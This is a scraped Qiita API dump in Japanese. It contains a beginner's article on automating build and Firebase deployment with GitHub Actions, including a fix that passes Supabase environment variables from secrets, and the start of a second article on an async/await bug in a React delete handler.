class=\"s\">actions/checkout@v4</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Setup Node.js and cache</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-node@v2</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">node-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">18\"</span>\n          <span class=\"na\">cache</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">npm\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Download Artifact</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/download-artifact@main</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n          <span class=\"na\">path</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Deploy to Firebase</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">joinflux/firebase-tools@v9.16.0</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">args</span><span class=\"pi\">:</span> <span class=\"s\">deploy --project=study-record-7da4e --only hosting</span>\n        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">FIREBASE_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.FIREBASE_TOKEN }}</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"141:1-141:39\">おおまかな流れは下記です。</p>\n<ol data-sourcepos=\"143:1-145:0\">\n<li data-sourcepos=\"143:1-143:126\">project_buildで、buildを行い、upload-artifactでdist配下（buildしたモジュール）をアップロードする</li>\n<li data-sourcepos=\"144:1-145:0\">project_deployでdownload-artifactでアップロードしたモジュールをダウンロードし、ダウンロードしたものをdeployする。</li>\n</ol>\n<p data-sourcepos=\"146:1-146:81\">結果はsuccessとなり、build・deployまですることができました。</p>\n<p data-sourcepos=\"148:1-148:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0c56430c-4bf2-4c85-8c76-fea6424ffb26.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=404a099e67f3e5d1ac74d2d21e457f37\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0c56430c-4bf2-4c85-8c76-fea6424ffb26.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=404a099e67f3e5d1ac74d2d21e457f37\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0c56430c-4bf2-4c85-8c76-fea6424ffb26.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=bf8cb0cc1856b0b26d891498d0c1dca1 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0c56430c-4bf2-4c85-8c76-fea6424ffb26.png\" loading=\"lazy\"></a></p>\n<h4 data-sourcepos=\"150:1-150:71\">\n<span id=\"実際にサイトにアクセスすると真っ白い画面に\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E9%9A%9B%E3%81%AB%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AB%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%99%E3%82%8B%E3%81%A8%E7%9C%9F%E3%81%A3%E7%99%BD%E3%81%84%E7%94%BB%E9%9D%A2%E3%81%AB\"><i class=\"fa fa-link\"></i></a>実際にサイトにアクセスすると真っ白い画面に…</h4>\n<p data-sourcepos=\"152:1-152:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbf9f14a0-4177-4fbb-bae2-8fa3e0f84737.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=45c2ab94a38ac08ea6bf3418de687540\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbf9f14a0-4177-4fbb-bae2-8fa3e0f84737.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=45c2ab94a38ac08ea6bf3418de687540\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fbf9f14a0-4177-4fbb-bae2-8fa3e0f84737.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=421fda955accafe650424718e23db7e0 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/bf9f14a0-4177-4fbb-bae2-8fa3e0f84737.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"154:1-154:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7ba77c00-ed3b-4187-b32b-3f36402f56b8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=aea779d160564083d1d803070dc2ca1c\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7ba77c00-ed3b-4187-b32b-3f36402f56b8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=aea779d160564083d1d803070dc2ca1c\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7ba77c00-ed3b-4187-b32b-3f36402f56b8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=c681b1c8c1845b21438fc2c5bc911bac 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7ba77c00-ed3b-4187-b32b-3f36402f56b8.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"156:1-156:90\">supabaseUrl is required.のエラーがコンソール上に表示されていました。</p>\n<p data-sourcepos=\"158:1-158:58\"><iframe id=\"qiita-embed-content__8bf1fdbcd50923635dfe2674b3bf0188\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8bf1fdbcd50923635dfe2674b3bf0188\" data-content=\"https%3A%2F%2Fqiita.com%2Fgantarooou_js%2Fitems%2Fbc493bba82a8a6b1ab32\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"160:1-160:36\">こちらの記事を参考に修正</p>\n<div class=\"code-frame\" data-lang=\"diff_yaml\" data-sourcepos=\"162:1-185:3\">\n<div class=\"code-lang\"><span class=\"bold\">release.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">project_build</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v4</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Setup Node.js</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-node@v2</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">node-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">18\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm install</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run build</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">npm run build</span>\n<span class=\"hil\"><span class=\"na\">+       env</span><span class=\"pi\">:</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>        <span class=\"na\">VITE_NEXT_PUBLIC_SUPABASE_URL</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.VITE_NEXT_PUBLIC_SUPABASE_URL }}</span>\n</span><span class=\"hil\"><span class=\"na\">+         VITE_NEXT_PUBLIC_SUPABASE_ANON_KEY</span><span class=\"pi\">:</span> <span class=\"s\">${{secrets.VITE_NEXT_PUBLIC_SUPABASE_ANON_KEY }}</span>\n</span>      <span class=\"s\">- name</span><span class=\"err\">:</span> <span class=\"s\">Archive Production Artifact</span>\n        <span class=\"s\">uses</span><span class=\"err\">:</span> <span class=\"s\">actions/upload-artifact@main</span>\n        <span class=\"s\">with</span><span class=\"err\">:</span>\n          <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n          <span class=\"na\">path</span><span class=\"pi\">:</span> <span class=\"s\">dist</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"188:1-188:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"189:1-189:114\">過去のエラー解消記事に助けられました。私も助けられるような記事書きたいです。</p>\n<h1 data-sourcepos=\"191:1-191:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"193:1-193:37\"><iframe id=\"qiita-embed-content__cd72e544aa2c92d72213f44986c4bf6b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__cd72e544aa2c92d72213f44986c4bf6b\" data-content=\"https%3A%2F%2Fwa3.i-3-i.info%2Fword13803.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"195:1-195:37\"><iframe id=\"qiita-embed-content__135ecad7784383f3880c50865ff50a8f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__135ecad7784383f3880c50865ff50a8f\" data-content=\"https%3A%2F%2Fwa3.i-3-i.info%2Fword13801.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"197:1-197:50\"><iframe id=\"qiita-embed-content__ae48d06995377eacf339f729e0ee3c0a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__ae48d06995377eacf339f729e0ee3c0a\" data-content=\"https%3A%2F%2Fqiita.com%2FTeach%2Fitems%2Fd2c4d7bec98228df1807\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"199:1-199:47\"><iframe id=\"qiita-embed-content__58bfbd07617dfa6f0d191a7f16815520\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__58bfbd07617dfa6f0d191a7f16815520\" data-content=\"https%3A%2F%2Fgithub.com%2Fmarketplace%2Factions%2Fcheckout\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"201:1-201:53\"><iframe id=\"qiita-embed-content__72678aaac05e7395e25c29ee0b0aac6a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__72678aaac05e7395e25c29ee0b0aac6a\" data-content=\"https%3A%2F%2Fgithub.com%2Fmarketplace%2Factions%2Ffirebase-tools\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"203:1-203:54\"><iframe id=\"qiita-embed-content__7f2e5724a4b4981f45f15525c0cedf65\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7f2e5724a4b4981f45f15525c0cedf65\" data-content=\"https%3A%2F%2Fgithub.com%2Fmarketplace%2Factions%2Fupload-artifact\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"205:1-205:43\"><iframe id=\"qiita-embed-content__5e0e499f150a74416d50f033edb0280b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__5e0e499f150a74416d50f033edb0280b\" data-content=\"https%3A%2F%2Fgithub.com%2Fmarketplace%3Ftype%3Dactions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nGithubActionsで自動デプロイ(cd)することに三連休を費やしました。\n非常に時間がかかってしまったので、今後のためにプロセスをまとめます。\n\n# 実現したいこと\nGithubActionsを用いて、プロジェクトをpush時にビルドとデプロイまで行う。\n\n# 行ったこと\n### 1.GithubActionsの理解\nこちらの記事を参考に使い方を把握しました。\n\nhttps://qiita.com/Teach/items/d2c4d7bec98228df1807\n\n#### ここでの疑問１「ymlとは何？」\n\nhttps://wa3.i-3-i.info/word13803.html\n\nhttps://wa3.i-3-i.info/word13801.html\n\n上記サイトより引用\n>YAMLのルールに従って書かれた、テキストファイルのこと\n>> 構造化されたデータを表現するのに便利な、ファイルの書き方ルール（のひとつ）\n\nヤムルと読むそう\nXMLなどの類のひとつ、データのやりとりに使われる書き方のひとつと理解しました。\n\n#### ここでの疑問2「.ymlに記載の内容がわからない」\n\n「GitHub Actions　リファレンス」で検索するとドキュメントがでてきました。\n\nhttps://docs.github.com/ja/actions/writing-workflows/workflow-syntax-for-github-actions#name\n\n各構文を検索すると具体例とともに説明が記載されています。\n\n### 2.GithubActionsでbuildできるようにする\n1.で学んだことを元に、CDしたいプロジェクトにymlファイルを作成しました。\n\n```yml:release.yml\nname: Release\n\non:\n  workflow_dispatch:\n\njobs:\n  project_build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run build\n```\n\n結果はエラー\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1a4082f6-d5e5-4e3b-81c7-b8f5f9fa1261.png)\n\nこちらを参考に修正\n\nhttps://zenn.dev/jinwatanabe/articles/4026d373383739#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\n\n```yml:release.yml\nname: Release\n\non:\n  workflow_dispatch:\n\njobs:\n  project_build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n      - name: Setup Node.js\n        uses: actions/setup-node@v2\n        with:\n          node-version: \"18\"\n      - name: Install dependencies\n        run: npm install\n      - name: Run build\n        run: npm run build\n```\n\nワークフローがリポジトリにアクセスできるよう、チェックアウトを行う。\nnpmコマンドを使用できるようにする必要がありました。\n\n### 3.GithubActionsでdeployできるようにする\n2.で参考にした記事ではfirebase-toolsを使用していました。\n\n\nhttps://zenn.dev/jinwatanabe/articles/4026d373383739#3.-github-actions-%E3%81%AE%E8%A8%AD%E5%AE%9A\n\nfirebase-tools、upload-artifactを使用して、build⇒deployをするように追記しました。\nまた、push時にデプロイされるようにon: pushに修正しました。\n\n```yml:release.yml\nname: Release\n\non: push\n\njobs:\n  project_build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n      - name: Setup Node.js\n        uses: actions/setup-node@v2\n        with:\n          node-version: \"18\"\n      - name: Install dependencies\n        run: npm install\n      - name: Run build\n        run: npm run build\n      - name: Archive Production Artifact\n        uses: actions/upload-artifact@main\n        with:\n          name: dist\n          path: dist\n\n  project_deploy:\n    runs-on: ubuntu-latest\n    needs: project_build\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n      - name: Setup Node.js and cache\n        uses: actions/setup-node@v2\n        with:\n          node-version: \"18\"\n          cache: \"npm\"\n      - name: Download Artifact\n        uses: actions/download-artifact@main\n        with:\n          name: dist\n          path: dist\n      - name: Deploy to Firebase\n        uses: joinflux/firebase-tools@v9.16.0\n        with:\n          args: deploy --project=study-record-7da4e --only hosting\n        env:\n          FIREBASE_TOKEN: ${{ secrets.FIREBASE_TOKEN }}\n```\n\nおおまかな流れは下記です。\n\n1. project_buildで、buildを行い、upload-artifactでdist配下（buildしたモジュール）をアップロードする\n2. project_deployでdownload-artifactでアップロードしたモジュールをダウンロードし、ダウンロードしたものをdeployする。\n\n結果はsuccessとなり、build・deployまですることができました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0c56430c-4bf2-4c85-8c76-fea6424ffb26.png)\n\n#### 実際にサイトにアクセスすると真っ白い画面に…\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/bf9f14a0-4177-4fbb-bae2-8fa3e0f84737.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7ba77c00-ed3b-4187-b32b-3f36402f56b8.png)\n\nsupabaseUrl is required.のエラーがコンソール上に表示されていました。\n\nhttps://qiita.com/gantarooou_js/items/bc493bba82a8a6b1ab32\n\nこちらの記事を参考に修正\n\n```diff_yaml:release.yml\njobs:\n  project_build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n      - name: Setup Node.js\n        uses: actions/setup-node@v2\n        with:\n          node-version: \"18\"\n      - name: Install dependencies\n        run: npm install\n      - name: Run build\n        run: npm run build\n+       env:\n+         VITE_NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.VITE_NEXT_PUBLIC_SUPABASE_URL }}\n+         VITE_NEXT_PUBLIC_SUPABASE_ANON_KEY: ${{secrets.VITE_NEXT_PUBLIC_SUPABASE_ANON_KEY }}\n      - name: Archive Production Artifact\n        uses: actions/upload-artifact@main\n        with:\n          name: dist\n          path: dist\n```\n\n\n# おわりに\n過去のエラー解消記事に助けられました。私も助けられるような記事書きたいです。\n\n# 参考\n\nhttps://wa3.i-3-i.info/word13803.html\n\nhttps://wa3.i-3-i.info/word13801.html\n\nhttps://qiita.com/Teach/items/d2c4d7bec98228df1807\n\nhttps://github.com/marketplace/actions/checkout\n\nhttps://github.com/marketplace/actions/firebase-tools\n\nhttps://github.com/marketplace/actions/upload-artifact\n\nhttps://github.com/marketplace?type=actions\n","coediting":false,"comments_count":0,"created_at":"2025-02-25T22:03:34+09:00","group":null,"id":"65e301521f49e17ec11f","likes_count":2,"private":false,"reactions_count":0,"stocks_count":2,"tags":[{"name":"初心者","versions":[]},{"name":"cd","versions":[]},{"name":"GitHubActions","versions":[]}],"title":"Github Actionsを使ってpush時にCDを行う","updated_at":"2025-02-25T22:03:34+09:00","url":"https://qiita.com/asa129/items/65e301521f49e17ec11f","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":650,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:159\">削除機能を実装中に再表示で削除したデータが表示される事象に詰まってしまったため、備忘録として記事にします。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-6:156\">削除ボタン押下後もデータが表示されたまま、リロードをすると消える状態<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fed718043-5a64-453b-88ad-02dc482c6ddc.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a20b453b992d5c0a339043dfec13f71d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fed718043-5a64-453b-88ad-02dc482c6ddc.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a20b453b992d5c0a339043dfec13f71d\" alt=\"レコーディング 2025-02-20 200056.gif\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fed718043-5a64-453b-88ad-02dc482c6ddc.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=cf385f70240f82285d8aca18e4c11734 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ed718043-5a64-453b-88ad-02dc482c6ddc.gif\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"8:1-9:122\">DBでは該当データが消えることを確認<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff1267434-39a8-4d43-a91d-7a573406738c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=312df6e787ac6906e15b528db122f6d6\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff1267434-39a8-4d43-a91d-7a573406738c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=312df6e787ac6906e15b528db122f6d6\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff1267434-39a8-4d43-a91d-7a573406738c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=460e4bb3b7334235d8e62ea803856e91 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f1267434-39a8-4d43-a91d-7a573406738c.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"11:1-11:21\">この時のコード</p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"12:1-21:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.jsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">records</span><span class=\"p\">,</span> <span class=\"nx\">setRecords</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">([]);</span>\n<span class=\"c1\">// 削除ボタン押下</span>\n<span class=\"kd\">const</span> <span class=\"nx\">onClickDelete</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">deleteData</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 削除後のデータを全件取得する</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">datas</span> <span class=\"o\">=</span>  <span class=\"nf\">getAllDatas</span><span class=\"p\">();</span>\n    <span class=\"nx\">datas</span><span class=\"p\">.</span><span class=\"nf\">then</span><span class=\"p\">((</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span><span class=\"nf\">setRecords</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)});</span>\n<span class=\"p\">};</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"23:1-23:131\">deleteData(id);の処理が完了する前に、const datas =  getAllDatas();の処理が走っていたことが原因でした。</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"25:1-36:3\">\n<div class=\"code-lang\"><span class=\"bold\">supabaseFunctions.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">supabase</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">./spabase</span><span class=\"dl\">\"</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">getAllDatas</span> <span class=\"o\">=</span> <span class=\"k\">async</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">datas</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span><span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">study-record</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nf\">select</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">*</span><span class=\"dl\">\"</span><span class=\"p\">);</span> \n  <span class=\"k\">return</span> <span class=\"nx\">datas</span><span class=\"p\">.</span><span class=\"nx\">data</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">deleteData</span> <span class=\"o\">=</span> <span class=\"k\">async</span><span class=\"p\">(</span><span class=\"nx\">props</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">response</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span><span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">study-record</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"k\">delete</span><span class=\"p\">().</span><span class=\"nf\">eq</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">id</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"nx\">props</span><span class=\"p\">)</span>\n<span class=\"p\">};</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"38:1-38:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h3 data-sourcepos=\"39:1-39:24\">\n<span id=\"async-awaitを使う\" class=\"fragment\"></span><a href=\"#async-await%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>async awaitを使う</h3>\n<p data-sourcepos=\"41:1-41:24\">参考記事より引用</p>\n<blockquote data-sourcepos=\"42:1-44:229\">\n<p data-sourcepos=\"42:2-44:229\">async とは?<br>\nasync を関数の前に付けることで、その関数は非同期であることを示します。<br>\n関数（プログラムのまとまり）の前に async を付けると、「この関数の中には、終わるのを待たなければいけない作業があるかも」とプログラムに教えることができます。</p>\n</blockquote>\n<blockquote data-sourcepos=\"46:1-47:172\">\n<p data-sourcepos=\"46:2-47:172\">await とは?<br>\nawait を使うと、「この作業が終わるのを待つよ」という指示が出せます。await は必ず async 関数の中で使用する必要があります。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"49:1-60:3\">\n<div class=\"code-lang\"><span class=\"bold\">reactApp.jsx</span></div>\n<div class=\"highlight\"><pre><code>  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">records</span><span class=\"p\">,</span> <span class=\"nx\">setRecords</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">([]);</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">getDatas</span> <span class=\"o\">=</span>  <span class=\"k\">async</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">datas</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">getAllDatas</span><span class=\"p\">();</span>\n    <span class=\"nf\">setRecords</span><span class=\"p\">(</span><span class=\"nx\">datas</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"c1\">// 削除ボタン押下</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">onClickDelete</span> <span 